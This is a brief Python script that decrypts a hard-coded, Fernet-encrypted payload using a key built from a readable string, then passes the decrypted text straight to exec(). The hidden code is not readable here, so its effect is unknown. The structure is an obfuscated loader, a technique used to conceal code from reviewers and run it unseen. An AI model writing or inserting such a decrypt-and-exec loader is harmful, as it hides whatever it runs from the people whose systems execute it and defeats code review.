import base64
from cryptography.fernet import Fernet

payload = b'gAAAAABlWXMVBHHk-gIl1UBDJrsiWdtmXKeMjVRODbqH1gbiokJf-tt06dCynGC3ESZcOMIogpYmNbUdCiuxmm_qLAiV4sSMIdP3FuDUs07K1zJtYrzGAMM='

key_str = 'correctstaplecorrectstaplecorrec'
key_base64 = base64.b64encode(key_str.encode())

f = Fernet(key_base64)
plain = f.decrypt(payload)

try:
    exec(plain.decode())
except Exception as e:
    print(f"Error executing code: {e}")

